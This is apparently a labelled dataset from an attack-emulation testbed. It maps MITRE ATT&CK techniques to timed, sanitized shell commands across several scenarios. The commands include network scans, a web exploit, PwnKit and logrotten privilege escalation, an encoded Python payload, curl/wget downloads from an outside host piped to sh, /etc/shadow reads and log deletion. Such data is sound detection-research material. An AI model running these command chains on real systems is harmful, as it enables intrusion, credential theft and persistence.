scenario;tactics;techniques;technique_names;event_id;cmd;start;end
1_pwnkit_pam;defense-evasion;T1070.004;NA;40;rm;1758528151.362522;1758528188.0
1_pwnkit_pam;discovery;T1033;NA;23;id;1758528214.003416;1758528220.0
1_pwnkit_pam;credential-access;T1003.008;NA;24;cat__etc_shadow;1758528244.279949;1758528250.0
1_pwnkit_pam;discovery;T1120;NA;25;lspci;1758528259.318452;1758528265.0
1_pwnkit_pam;discovery;T1120;NA;26;command__v_lsusb;1758528274.368905;1758528280.0
1_pwnkit_pam;discovery;T1124;NA;27;date;1758528289.403382;1758528295.0
1_pwnkit_pam;defense-evasion_discovery;T1497.001;NA;28;find__usr__name___virtualbox__;1758528304.422983;1758528340.0
1_pwnkit_sshkey;reconnaissancereconnaissance;T1590.002_T1591;NA;1;dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com;1758116138.049118;1758116148.0
1_pwnkit_sshkey;reconnaissancereconnaissance;T1595_T1592.002;NA;2;nmap__O__sT___top_ports_100_video_attackbed_com;1758116157.726172;1758116176.0
1_pwnkit_sshkey;reconnaissance;T1595.002;NA;3;nikto__host_video_attackbed_com;1758116185.834255;1758116238.0
1_pwnkit_sshkey;reconnaissance;T1595.003;NA;4;ffuf__w__usr_local_share_SecLists_Discovery_Web_Content_raft_small_directories_lowercase_txt__u_http___video_attackbed_com_FUZZ;1758116247.113977;1758116349.0
1_pwnkit_sshkey;initial-accessexecution;T1190_T1059.006;NA;5;exploit_unix_webapp_zoneminder_snapshots;1758116358.381726;1758116411.0
1_pwnkit_sshkey;command-and-control;T1105;NA;6;upload__var_www_html_linpeas_sh;1758116436.940741;1758116444.0
1_pwnkit_sshkey;execution;T1059;NA;7;python3__c__import_pty_pty_spawn___bash_____;1758116469.610732;1758116476.0
1_pwnkit_sshkey;execution;T1059;NA;8;export_SHELL_bash;1758116485.929767;1758116493.0
1_pwnkit_sshkey;execution;T1059;NA;9;export_TERM_xterm256_color;1758116502.254137;1758116509.0
1_pwnkit_sshkey;execution;T1059;NA;10;stty_rows_38_columns_116;1758116518.618127;1758116525.0
1_pwnkit_sshkey;execution;T1059;NA;11;export_PS1__PWN__;1758116534.98066;1758116542.0
1_pwnkit_sshkey;execution;T1059;NA;12;chmod__x_linpeas_sh;1758116551.346538;1758116558.0
1_pwnkit_sshkey;discoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscovery;T1087_T1083_T1201_T1069_T1057_T1518_T1082_T1614_T1016_T1049_T1033_T1007_T1615;NA;13;__linpeas_sh__s__q__N_2___dev_null;1758116567.668194;1758117173.0
1_pwnkit_sshkey;discovery;T1033;NA;14;id;1758117182.94761;1758117189.0
1_pwnkit_sshkey;command-and-control;T1105;NA;35;wget_http___192_42_1_174_PwnKit____dev_null_2__1;1758117198.171334;1758117205.0
1_pwnkit_sshkey;privilege-escalation;T1068;NA;36;chmod__x_PwnKit______PwnKit;1758117214.487099;1758117221.0
1_pwnkit_sshkey;discovery;T1033;NA;37;id;1758117230.734389;1758117238.0
1_pwnkit_sshkey;command-and-controlpersistence_privilege-escalation;T1105_T1098.004;NA;43;cd__root__wget_http___192_42_1_174_README_txt;1758117247.05672;1758117254.0
1_pwnkit_sshkey;defense-evasionpersistence_privilege-escalation;T1218_T1098.004;NA;44;split___filter__cat__FILE___xargs_bash__c____C_2000_README_txt;1758117263.421778;1758117270.0
1_pwnkit_sshkey;defense-evasion;T1070.004;NA;40;rm;1758117279.827845;1758117287.0
1_pwnkit_sshkey;defense-evasion;T1070.004;NA;40;rm;1758117312.506569;1758117319.0
1_pwnkit_sshkey;defense-evasion;T1070.004;NA;40;rm;1758117328.8718;1758117366.0
1_pwnkit_sshkey;discovery;T1033;NA;23;id;1758117391.597199;1758117398.0
1_pwnkit_sshkey;credential-access;T1003.008;NA;24;cat__etc_shadow;1758117422.21856;1758117428.0
1_pwnkit_sshkey;discovery;T1120;NA;25;lspci;1758117437.242699;1758117443.0
1_pwnkit_sshkey;discovery;T1120;NA;26;command__v_lsusb;1758117452.292671;1758117458.0
1_pwnkit_sshkey;discovery;T1124;NA;27;date;1758117467.316853;1758117473.0
1_pwnkit_sshkey;defense-evasion_discovery;T1497.001;NA;28;find__usr__name___virtualbox__;1758117482.335585;1758117518.0
1_racecondition_localaccount;reconnaissancereconnaissance;T1590.002_T1591;NA;1;dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com;1764940818.969356;1764940829.0
1_racecondition_localaccount;reconnaissancereconnaissance;T1595_T1592.002;NA;2;nmap__O__sT___top_ports_100_video_attackbed_com;1764940838.980146;1764940858.0
1_racecondition_localaccount;reconnaissance;T1595.002;NA;3;nikto__host_video_attackbed_com;1764940867.077353;1764940916.0
1_racecondition_localaccount;reconnaissance;T1595.003;NA;4;ffuf__w__usr_local_share_SecLists_Discovery_Web_Content_raft_small_directories_lowercase_txt__u_http___video_attackbed_com_FUZZ;1764940925.545733;1764941027.0
1_racecondition_localaccount;initial-accessexecution;T1190_T1059.006;NA;5;exploit_unix_webapp_zoneminder_snapshots;1764941036.908777;1764941087.0
1_racecondition_localaccount;command-and-control;T1105;NA;45;upload__var_www_html_logrotten;1764941113.499548;1764941120.0
1_racecondition_localaccount;command-and-control;T1105;NA;6;upload__var_www_html_linpeas_sh;1764941129.820785;1764941137.0
1_racecondition_localaccount;execution;T1059;NA;7;python3__c__import_pty_pty_spawn___bash_____;1764941162.460073;1764941169.0
1_racecondition_localaccount;execution;T1059;NA;8;export_SHELL_bash;1764941178.694212;1764941186.0
1_racecondition_localaccount;execution;T1059;NA;9;export_TERM_xterm256_color;1764941195.061192;1764941202.0
1_racecondition_localaccount;execution;T1059;NA;10;stty_rows_38_columns_116;1764941211.374693;1764941218.0
1_racecondition_localaccount;execution;T1059;NA;11;export_PS1__PWN__;1764941227.749459;1764941235.0
1_racecondition_localaccount;execution;T1059;NA;46;chmod__x_logrotten;1764941244.07444;1764941251.0
1_racecondition_localaccount;execution;T1059;NA;12;chmod__x_linpeas_sh;1764941260.449106;1764941267.0
1_racecondition_localaccount;discoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscovery;T1087_T1083_T1201_T1069_T1057_T1518_T1082_T1614_T1016_T1049_T1033_T1007_T1615;NA;13;__linpeas_sh__s__q__N_2___dev_null;1764941276.773842;1764941884.0
1_racecondition_localaccount;discovery;T1033;NA;14;id;1764941893.099862;1764941899.0
1_racecondition_localaccount;privilege-escalation_persistence;T1546;NA;47;cd__var_www_default;1764941908.339701;1764941915.0
1_racecondition_localaccount;privilege-escalation_persistence;T1546;NA;48;echo__if_____id__u____eq_0____then_____echo_exec____import______zlib_____decompress____import______base64_____b64decode____import______codecs_____getencoder____utf_8________eNo9UE1LxDAQPTe_IrckGMO2xhUXK4h4EBHB3ZuItMmooWkakqxWxf9uQxbnMMObefPmw4x_CgnHSQ2Q_Lc1Pe_7CGvJYwp7lXgyI6DXKeAZG4dD596A1iu2QVUKX4uvYluaRQm04Qe8fbi_e9nuHm_u7lnmCTU5BypRSurzRshG1KI_k4SfLMYypQ_QDaiCWYFPWTsPF9ECeHrKkG3LTmLvfKcGSi5vCY8igPqgkrGn1TPS7QFbhj7fjQVswVHNLuwip4__q8clzRDMoGg_W2hQ0_gDxEjLB0S_ljmpITP5D4lkE38Z_gPO1l75______0___________exec___which_python____which_python3____which_python2______sh____fi____payload;1764941924.7;1764941931.0
1_racecondition_localaccount;privilege-escalation_persistence;T1546;NA;49;rm;1764941940.965068;1764941948.0
1_racecondition_localaccount;privilege-escalation_persistence;T1546;NA;50;mkdir_log;1764941957.318863;1764941964.0
1_racecondition_localaccount;privilege-escalation_persistence;T1546;NA;51;echo_empty___log_accesss_log;1764941973.596597;1764941980.0
1_racecondition_localaccount;privilege-escalation_persistence;T1546;NA;52;_tmp_logrotten__p__var_www_default_payload__var_www_default_log_accesss_log;1764941989.958567;1764943617.0
1_racecondition_localaccount;execution;T1059;NA;17;python3__c__import_pty_pty_spawn___bash_____;1764943619.492274;1764943626.0
1_racecondition_localaccount;execution;T1059;NA;18;export_SHELL_bash;1764943635.864377;1764943643.0
1_racecondition_localaccount;execution;T1059;NA;19;export_TERM_xterm256_color;1764943652.235804;1764943659.0
1_racecondition_localaccount;discovery;T1033;NA;20;id;1764943684.843396;1764943692.0
1_racecondition_localaccount;command-and-controlpersistence;T1105_T1136.001;NA;21;curl_http___192_42_1_174_README_txt_3___sh;1764943701.15052;1764943748.0
1_racecondition_localaccount;discovery;T1033;NA;22;id;1764943757.52622;1764943795.0
1_racecondition_localaccount;discovery;T1033;NA;23;id;1764943835.386226;1764943841.0
1_racecondition_localaccount;credential-access;T1003.008;NA;24;cat__etc_shadow;1764943865.974801;1764943872.0
1_racecondition_localaccount;discovery;T1120;NA;25;lspci;1764943881.007924;1764943887.0
1_racecondition_localaccount;discovery;T1120;NA;26;command__v_lsusb;1764943896.054643;1764943902.0
1_racecondition_localaccount;discovery;T1124;NA;27;date;1764943911.083663;1764943917.0
1_racecondition_localaccount;defense-evasion_discovery;T1497.001;NA;28;find__usr__name___virtualbox__;1764943926.100459;1764943962.0
1_racecondition_pam;reconnaissancereconnaissance;T1590.002_T1591;NA;1;dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com;1765031791.486185;1765031802.0
1_racecondition_pam;reconnaissancereconnaissance;T1595_T1592.002;NA;2;nmap__O__sT___top_ports_100_video_attackbed_com;1765031811.642996;1765031830.0
1_racecondition_pam;reconnaissance;T1595.002;NA;3;nikto__host_video_attackbed_com;1765031839.76486;1765031889.0
1_racecondition_pam;reconnaissance;T1595.003;NA;4;ffuf__w__usr_local_share_SecLists_Discovery_Web_Content_raft_small_directories_lowercase_txt__u_http___video_attackbed_com_FUZZ;1765031898.405889;1765032000.0
1_racecondition_pam;initial-accessexecution;T1190_T1059.006;NA;5;exploit_unix_webapp_zoneminder_snapshots;1765032009.63012;1765032066.0
1_racecondition_pam;command-and-control;T1105;NA;45;upload__var_www_html_logrotten;1765032092.323715;1765032099.0
1_racecondition_pam;command-and-control;T1105;NA;6;upload__var_www_html_linpeas_sh;1765032108.603394;1765032115.0
1_racecondition_pam;execution;T1059;NA;7;python3__c__import_pty_pty_spawn___bash_____;1765032141.278635;1765032148.0
1_racecondition_pam;execution;T1059;NA;8;export_SHELL_bash;1765032157.653448;1765032165.0
1_racecondition_pam;execution;T1059;NA;9;export_TERM_xterm256_color;1765032174.025009;1765032181.0
1_racecondition_pam;execution;T1059;NA;10;stty_rows_38_columns_116;1765032190.354011;1765032197.0
1_racecondition_pam;execution;T1059;NA;11;export_PS1__PWN__;1765032206.673304;1765032214.0
1_racecondition_pam;execution;T1059;NA;46;chmod__x_logrotten;1765032223.044809;1765032230.0
1_racecondition_pam;execution;T1059;NA;12;chmod__x_linpeas_sh;1765032239.279798;1765032246.0
1_racecondition_pam;discoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscovery;T1087_T1083_T1201_T1069_T1057_T1518_T1082_T1614_T1016_T1049_T1033_T1007_T1615;NA;13;__linpeas_sh__s__q__N_2___dev_null;1765032255.552922;1765032862.0
1_racecondition_pam;discovery;T1033;NA;14;id;1765032871.886124;1765032878.0
1_racecondition_pam;privilege-escalation_persistence;T1546;NA;47;cd__var_www_default;1765032887.091693;1765032894.0
1_racecondition_pam;privilege-escalation_persistence;T1546;NA;48;echo__if_____id__u____eq_0____then_____echo_exec____import______zlib_____decompress____import______base64_____b64decode____import______codecs_____getencoder____utf_8________eNo9UE1LxDAQPTe_IrckGMO2xhUXK4h4EBHB3ZuItMmooWkakqxWxf9uQxbnMMObefPmw4x_CgnHSQ2Q_Lc1Pe_7CGvJYwp7lXgyI6DXKeAZG4dD596A1iu2QVUKX4uvYluaRQm04Qe8fbi_e9nuHm_u7lnmCTU5BypRSurzRshG1KI_k4SfLMYypQ_QDaiCWYFPWTsPF9ECeHrKkG3LTmLvfKcGSi5vCY8igPqgkrGn1TPS7QFbhj7fjQVswVHNLuwip4__q8clzRDMoGg_W2hQ0_gDxEjLB0S_ljmpITP5D4lkE38Z_gPO1l75______0___________exec___which_python____which_python3____which_python2______sh____fi____payload;1765032903.462723;1765032910.0
1_racecondition_pam;privilege-escalation_persistence;T1546;NA;49;rm;1765032919.642859;1765032927.0
1_racecondition_pam;privilege-escalation_persistence;T1546;NA;50;mkdir_log;1765032936.011704;1765032943.0
1_racecondition_pam;privilege-escalation_persistence;T1546;NA;51;echo_empty___log_accesss_log;1765032952.387224;1765032959.0
1_racecondition_pam;privilege-escalation_persistence;T1546;NA;52;_tmp_logrotten__p__var_www_default_payload__var_www_default_log_accesss_log;1765032968.7094;1765034636.0
1_racecondition_pam;execution;T1059;NA;17;python3__c__import_pty_pty_spawn___bash_____;1765034639.945052;1765034647.0
1_racecondition_pam;execution;T1059;NA;18;export_SHELL_bash;1765034656.185826;1765034663.0
1_racecondition_pam;execution;T1059;NA;19;export_TERM_xterm256_color;1765034672.557695;1765034679.0
1_racecondition_pam;discovery;T1033;NA;20;id;1765034705.189427;1765034712.0
1_racecondition_pam;command-and-controlcredential-access_defense-evasion_persistence;T1105_T1556.003;NA;29;curl_http___192_42_1_174_README_txt_5___sh;1765034721.422592;1765034768.0
1_racecondition_pam;discovery;T1033;NA;22;id;1765034777.791021;1765034813.0
1_racecondition_pam;discovery;T1033;NA;23;id;1765034855.568805;1765034861.0
1_racecondition_pam;credential-access;T1003.008;NA;24;cat__etc_shadow;1765034885.838599;1765034891.0
1_racecondition_pam;discovery;T1120;NA;25;lspci;1765034900.887925;1765034906.0
1_racecondition_pam;discovery;T1120;NA;26;command__v_lsusb;1765034915.979945;1765034922.0
1_racecondition_pam;discovery;T1124;NA;27;date;1765034931.016134;1765034937.0
1_racecondition_pam;defense-evasion_discovery;T1497.001;NA;28;find__usr__name___virtualbox__;1765034946.031964;1765034982.0
1_racecondition_sshkey;reconnaissancereconnaissance;T1590.002_T1591;NA;1;dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com;1765301167.041955;1765301177.0
1_racecondition_sshkey;reconnaissancereconnaissance;T1595_T1592.002;NA;2;nmap__O__sT___top_ports_100_video_attackbed_com;1765301186.022941;1765301205.0
1_racecondition_sshkey;reconnaissance;T1595.002;NA;3;nikto__host_video_attackbed_com;1765301214.149395;1765301267.0
1_racecondition_sshkey;reconnaissance;T1595.003;NA;4;ffuf__w__usr_local_share_SecLists_Discovery_Web_Content_raft_small_directories_lowercase_txt__u_http___video_attackbed_com_FUZZ;1765301276.047597;1765301377.0
1_racecondition_sshkey;initial-accessexecution;T1190_T1059.006;NA;5;exploit_unix_webapp_zoneminder_snapshots;1765301386.884112;1765301443.0
1_racecondition_sshkey;command-and-control;T1105;NA;45;upload__var_www_html_logrotten;1765301469.507631;1765301476.0
1_racecondition_sshkey;command-and-control;T1105;NA;6;upload__var_www_html_linpeas_sh;1765301485.863477;1765301493.0
1_racecondition_sshkey;execution;T1059;NA;7;python3__c__import_pty_pty_spawn___bash_____;1765301518.528884;1765301525.0
1_racecondition_sshkey;execution;T1059;NA;8;export_SHELL_bash;1765301534.894591;1765301542.0
1_racecondition_sshkey;execution;T1059;NA;9;export_TERM_xterm256_color;1765301551.211196;1765301558.0
1_racecondition_sshkey;execution;T1059;NA;10;stty_rows_38_columns_116;1765301567.565409;1765301574.0
1_racecondition_sshkey;execution;T1059;NA;11;export_PS1__PWN__;1765301583.883965;1765301591.0
1_racecondition_sshkey;execution;T1059;NA;46;chmod__x_logrotten;1765301600.223855;1765301607.0
1_racecondition_sshkey;execution;T1059;NA;12;chmod__x_linpeas_sh;1765301616.496847;1765301623.0
1_racecondition_sshkey;discoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscovery;T1087_T1083_T1201_T1069_T1057_T1518_T1082_T1614_T1016_T1049_T1033_T1007_T1615;NA;13;__linpeas_sh__s__q__N_2___dev_null;1765301632.769362;1765302240.0
1_racecondition_sshkey;discovery;T1033;NA;14;id;1765302249.009295;1765302255.0
1_racecondition_sshkey;privilege-escalation_persistence;T1546;NA;47;cd__var_www_default;1765302264.288692;1765302271.0
1_racecondition_sshkey;privilege-escalation_persistence;T1546;NA;48;echo__if_____id__u____eq_0____then_____echo_exec____import______zlib_____decompress____import______base64_____b64decode____import______codecs_____getencoder____utf_8________eNo9UE1LxDAQPTe_IrckGMO2xhUXK4h4EBHB3ZuItMmooWkakqxWxf9uQxbnMMObefPmw4x_CgnHSQ2Q_Lc1Pe_7CGvJYwp7lXgyI6DXKeAZG4dD596A1iu2QVUKX4uvYluaRQm04Qe8fbi_e9nuHm_u7lnmCTU5BypRSurzRshG1KI_k4SfLMYypQ_QDaiCWYFPWTsPF9ECeHrKkG3LTmLvfKcGSi5vCY8igPqgkrGn1TPS7QFbhj7fjQVswVHNLuwip4__q8clzRDMoGg_W2hQ0_gDxEjLB0S_ljmpITP5D4lkE38Z_gPO1l75______0___________exec___which_python____which_python3____which_python2______sh____fi____payload;1765302280.512243;1765302287.0
1_racecondition_sshkey;privilege-escalation_persistence;T1546;NA;49;rm;1765302296.793497;1765302304.0
1_racecondition_sshkey;privilege-escalation_persistence;T1546;NA;50;mkdir_log;1765302313.070087;1765302320.0
1_racecondition_sshkey;privilege-escalation_persistence;T1546;NA;51;echo_empty___log_accesss_log;1765302329.433574;1765302336.0
1_racecondition_sshkey;privilege-escalation_persistence;T1546;NA;52;_tmp_logrotten__p__var_www_default_payload__var_www_default_log_accesss_log;1765302345.795364;1765303984.0
1_racecondition_sshkey;execution;T1059;NA;17;python3__c__import_pty_pty_spawn___bash_____;1765303995.923855;1765304003.0
1_racecondition_sshkey;execution;T1059;NA;18;export_SHELL_bash;1765304012.284626;1765304019.0
1_racecondition_sshkey;execution;T1059;NA;19;export_TERM_xterm256_color;1765304028.641271;1765304035.0
1_racecondition_sshkey;discovery;T1033;NA;20;id;1765304061.318048;1765304068.0
1_racecondition_sshkey;command-and-controlpersistence_privilege-escalation;T1105_T1098.004;NA;30;curl_http___192_42_1_174_README_txt_1___sh;1765304077.49501;1765304124.0
1_racecondition_sshkey;discovery;T1033;NA;22;id;1765304133.870236;1765304170.0
1_racecondition_sshkey;discovery;T1033;NA;23;id;1765304211.837337;1765304218.0
1_racecondition_sshkey;credential-access;T1003.008;NA;24;cat__etc_shadow;1765304242.334289;1765304248.0
1_racecondition_sshkey;discovery;T1120;NA;25;lspci;1765304257.354626;1765304263.0
1_racecondition_sshkey;discovery;T1120;NA;26;command__v_lsusb;1765304272.396506;1765304278.0
1_racecondition_sshkey;discovery;T1124;NA;27;date;1765304287.427268;1765304293.0
1_racecondition_sshkey;defense-evasion_discovery;T1497.001;NA;28;find__usr__name___virtualbox__;1765304302.451498;1765304338.0
1_sudo_localaccount;reconnaissancereconnaissance;T1590.002_T1591;NA;1;dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com;1758538540.437451;1758538551.0
1_sudo_localaccount;reconnaissancereconnaissance;T1595_T1592.002;NA;2;nmap__O__sT___top_ports_100_video_attackbed_com;1758538560.601567;1758538579.0
1_sudo_localaccount;reconnaissance;T1595.002;NA;3;nikto__host_video_attackbed_com;1758538588.728395;1758538639.0
1_sudo_localaccount;reconnaissance;T1595.003;NA;4;ffuf__w__usr_local_share_SecLists_Discovery_Web_Content_raft_small_directories_lowercase_txt__u_http___video_attackbed_com_FUZZ;1758538648.131358;1758538749.0
1_sudo_localaccount;initial-accessexecution;T1190_T1059.006;NA;5;exploit_unix_webapp_zoneminder_snapshots;1758538758.927385;1758538811.0
1_sudo_localaccount;command-and-control;T1105;NA;6;upload__var_www_html_linpeas_sh;1758538837.464252;1758538844.0
1_sudo_localaccount;execution;T1059;NA;7;python3__c__import_pty_pty_spawn___bash_____;1758538870.206097;1758538877.0
1_sudo_localaccount;execution;T1059;NA;8;export_SHELL_bash;1758538886.562283;1758538893.0
1_sudo_localaccount;execution;T1059;NA;9;export_TERM_xterm256_color;1758538902.934745;1758538910.0
1_sudo_localaccount;execution;T1059;NA;10;stty_rows_38_columns_116;1758538919.250469;1758538926.0
1_sudo_localaccount;execution;T1059;NA;11;export_PS1__PWN__;1758538935.622411;1758538942.0
1_sudo_localaccount;execution;T1059;NA;12;chmod__x_linpeas_sh;1758538951.887105;1758538959.0
1_sudo_localaccount;discoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscovery;T1087_T1083_T1201_T1069_T1057_T1518_T1082_T1614_T1016_T1049_T1033_T1007_T1615;NA;13;__linpeas_sh__s__q__N_2___dev_null;1758538968.214755;1758539575.0
1_sudo_localaccount;discovery;T1033;NA;14;id;1758539584.524763;1758539590.0
1_sudo_localaccount;privilege-escalation_defense-evasion;T1548.003;NA;53;dmesg__H;1758539599.67584;1758539605.0
1_sudo_localaccount;privilege-escalation_defense-evasion;T1548.003;NA;54;_bash;1758539614.909794;1758539622.0
1_sudo_localaccount;discovery;T1033;NA;37;id;1758539631.188209;1758539638.0
1_sudo_localaccount;command-and-controlpersistence;T1105_T1136.001;NA;38;cd__root__wget__O_README_txt_http___192_42_1_174_README_txt_2;1758539647.561268;1758539654.0
1_sudo_localaccount;defense-evasionpersistence;T1218_T1136.001;NA;39;split___filter__cat__FILE___xargs_bash__c____C_2000_README_txt;1758539663.927446;1758539671.0
1_sudo_localaccount;defense-evasion;T1070.004;NA;40;rm;1758539680.115667;1758539687.0
1_sudo_localaccount;defense-evasion;T1070.004;NA;40;rm;1758539712.798404;1758539750.0
1_sudo_localaccount;discovery;T1033;NA;23;id;1758539775.508689;1758539782.0
1_sudo_localaccount;credential-access;T1003.008;NA;24;cat__etc_shadow;1758539806.096683;1758539812.0
1_sudo_localaccount;discovery;T1120;NA;25;lspci;1758539821.128032;1758539827.0
1_sudo_localaccount;discovery;T1120;NA;26;command__v_lsusb;1758539836.179016;1758539842.0
1_sudo_localaccount;discovery;T1124;NA;27;date;1758539851.211379;1758539857.0
1_sudo_localaccount;defense-evasion_discovery;T1497.001;NA;28;find__usr__name___virtualbox__;1758539866.225465;1758539902.0
1_sudo_pam;reconnaissancereconnaissance;T1590.002_T1591;NA;1;dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com;1758548923.914565;1758548933.0
1_sudo_pam;reconnaissancereconnaissance;T1595_T1592.002;NA;2;nmap__O__sT___top_ports_100_video_attackbed_com;1758548942.51878;1758548961.0
1_sudo_pam;reconnaissance;T1595.002;NA;3;nikto__host_video_attackbed_com;1758548970.635068;1758549021.0
1_sudo_pam;reconnaissance;T1595.003;NA;4;ffuf__w__usr_local_share_SecLists_Discovery_Web_Content_raft_small_directories_lowercase_txt__u_http___video_attackbed_com_FUZZ;1758549030.305495;1758549132.0
1_sudo_pam;initial-accessexecution;T1190_T1059.006;NA;5;exploit_unix_webapp_zoneminder_snapshots;1758549141.317936;1758549198.0
1_sudo_pam;command-and-control;T1105;NA;6;upload__var_www_html_linpeas_sh;1758549223.841396;1758549231.0
1_sudo_pam;execution;T1059;NA;7;python3__c__import_pty_pty_spawn___bash_____;1758549256.520174;1758549263.0
1_sudo_pam;execution;T1059;NA;8;export_SHELL_bash;1758549272.878174;1758549280.0
1_sudo_pam;execution;T1059;NA;9;export_TERM_xterm256_color;1758549289.251623;1758549296.0
1_sudo_pam;execution;T1059;NA;10;stty_rows_38_columns_116;1758549305.636377;1758549312.0
1_sudo_pam;execution;T1059;NA;11;export_PS1__PWN__;1758549321.998459;1758549329.0
1_sudo_pam;execution;T1059;NA;12;chmod__x_linpeas_sh;1758549338.220715;1758549345.0
1_sudo_pam;discoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscovery;T1087_T1083_T1201_T1069_T1057_T1518_T1082_T1614_T1016_T1049_T1033_T1007_T1615;NA;13;__linpeas_sh__s__q__N_2___dev_null;1758549354.594335;1758549961.0
1_sudo_pam;discovery;T1033;NA;14;id;1758549970.930683;1758549977.0
1_sudo_pam;privilege-escalation_defense-evasion;T1548.003;NA;53;dmesg__H;1758549986.136474;1758549992.0
1_sudo_pam;privilege-escalation_defense-evasion;T1548.003;NA;54;_bash;1758550001.284033;1758550008.0
1_sudo_pam;discovery;T1033;NA;37;id;1758550017.661578;1758550024.0
1_sudo_pam;command-and-controlcredential-access_defense-evasion_persistence;T1105_T1556.003;NA;41;cd__root__wget__O_README_txt_http___192_42_1_174_README_txt_4;1758550033.971087;1758550041.0
1_sudo_pam;defense-evasioncredential-access_defense-evasion_persistence;T1218_T1556.003;NA;42;split___filter__cat__FILE___xargs_bash__c____C_2000_README_txt;1758550050.3347;1758550057.0
1_sudo_pam;defense-evasion;T1070.004;NA;40;rm;1758550066.702795;1758550073.0
1_sudo_pam;defense-evasion;T1070.004;NA;40;rm;1758550099.330234;1758550136.0
1_sudo_pam;discovery;T1033;NA;23;id;1758550162.030431;1758550168.0
1_sudo_pam;credential-access;T1003.008;NA;24;cat__etc_shadow;1758550192.411737;1758550198.0
1_sudo_pam;discovery;T1120;NA;25;lspci;1758550207.443136;1758550213.0
1_sudo_pam;discovery;T1120;NA;26;command__v_lsusb;1758550222.504126;1758550228.0
1_sudo_pam;discovery;T1124;NA;27;date;1758550237.547908;1758550243.0
1_sudo_pam;defense-evasion_discovery;T1497.001;NA;28;find__usr__name___virtualbox__;1758550252.567193;1758550288.0
1_sudo_sshkey;reconnaissancereconnaissance;T1590.002_T1591;NA;1;dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com;1758531536.031461;1758531547.0
1_sudo_sshkey;reconnaissancereconnaissance;T1595_T1592.002;NA;2;nmap__O__sT___top_ports_100_video_attackbed_com;1758531556.350862;1758531575.0
1_sudo_sshkey;reconnaissance;T1595.002;NA;3;nikto__host_video_attackbed_com;1758531584.453764;1758531635.0
1_sudo_sshkey;reconnaissance;T1595.003;NA;4;ffuf__w__usr_local_share_SecLists_Discovery_Web_Content_raft_small_directories_lowercase_txt__u_http___video_attackbed_com_FUZZ;1758531644.639806;1758531752.0
1_sudo_sshkey;initial-accessexecution;T1190_T1059.006;NA;5;exploit_unix_webapp_zoneminder_snapshots;1758531761.708097;1758531814.0
1_sudo_sshkey;command-and-control;T1105;NA;6;upload__var_www_html_linpeas_sh;1758531840.508579;1758531847.0
1_sudo_sshkey;execution;T1059;NA;7;python3__c__import_pty_pty_spawn___bash_____;1758531873.153882;1758531880.0
1_sudo_sshkey;execution;T1059;NA;8;export_SHELL_bash;1758531889.518481;1758531896.0
1_sudo_sshkey;execution;T1059;NA;9;export_TERM_xterm256_color;1758531905.803606;1758531913.0
1_sudo_sshkey;execution;T1059;NA;10;stty_rows_38_columns_116;1758531922.129407;1758531929.0
1_sudo_sshkey;execution;T1059;NA;11;export_PS1__PWN__;1758531938.431278;1758531945.0
1_sudo_sshkey;execution;T1059;NA;12;chmod__x_linpeas_sh;1758531954.710148;1758531962.0
